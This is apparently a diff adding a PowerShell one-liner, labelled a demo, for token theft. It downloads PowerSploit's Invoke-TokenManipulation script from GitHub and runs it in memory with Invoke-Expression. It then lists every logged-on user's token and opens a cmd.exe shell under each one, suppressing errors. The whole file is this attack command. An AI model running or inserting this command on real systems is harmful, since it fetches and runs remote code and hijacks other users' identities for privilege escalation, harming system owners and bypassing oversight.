@@ -1,0 +1,2 @@
+#StolenTokenCmdPopUps - just for demo fun :)
+Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -showall -ErrorAction SilentlyContinue | select username,processid | Sort-Object username -Unique |foreach { $testuser=$_.username;$testpid=$_.processid;write-host "Creating cmd for $testuser";Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessId $testpid -ErrorAction SilentlyContinue} 
